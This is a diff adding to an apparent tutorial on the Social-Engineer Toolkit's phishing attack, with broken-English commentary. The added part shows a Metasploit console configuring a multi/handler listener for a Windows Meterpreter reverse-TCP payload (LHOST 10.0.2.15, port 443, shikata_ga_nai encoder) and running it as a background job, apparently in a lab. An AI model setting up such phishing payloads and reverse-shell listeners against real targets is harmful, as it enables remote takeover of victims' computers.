@@ -218,3 +218,53 @@ set:phishing> Flag this message/s as high priority? [yes|no]: yes
 [*] SET has finished delivering the emails
 
 SOME LEFT WITH BLANK , Users perform according to their type of attack, I left blank
+
+then it OPENS  to msf [ METASPLOIT FRAMEWORK ] TO PERFORM module attcak if you choose type of method attack using auxiliarys and exploits modules
+
+set:phishing> Setup a listener [yes|no]: yes
+Metasploit tip: Display the Framework log using the log command, learn 
+more with help log
+                                                  
+ ______________________________________
+/ it looks like you're trying to run a \                                                                                                                                                                                          
+\ module                               /                                                                                                                                                                                          
+ --------------------------------------                                                                                                                                                                                           
+ \                                                                                                                                                                                                                                
+  \                                                                                                                                                                                                                               
+     __                                                                                                                                                                                                                           
+    /  \                                                                                                                                                                                                                          
+    |  |                                                                                                                                                                                                                          
+    @  @                                                                                                                                                                                                                          
+    |  |                                                                                                                                                                                                                          
+    || |/                                                                                                                                                                                                                         
+    || ||                                                                                                                                                                                                                         
+    |\_/|                                                                                                                                                                                                                         
+    \___/                                                                                                                                                                                                                         
+                                                                                                                                                                                                                                  
+
+       =[ metasploit v6.4.112-dev                               ]
++ -- --=[ 2,607 exploits - 1,325 auxiliary - 1,710 payloads     ]
++ -- --=[ 430 post - 49 encoders - 14 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+[*] Processing /root/.set//meta_config for ERB directives.
+resource (/root/.set//meta_config)> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (/root/.set//meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource (/root/.set//meta_config)> set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+resource (/root/.set//meta_config)> set LPORT 443
+LPORT => 443
+resource (/root/.set//meta_config)> set ENCODING shikata_ga_nai
+[!] Unknown datastore option: ENCODING. Did you mean ENCODER?
+ENCODING => shikata_ga_nai
+resource (/root/.set//meta_config)> set ExitOnSession false
+ExitOnSession => false
+resource (/root/.set//meta_config)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+
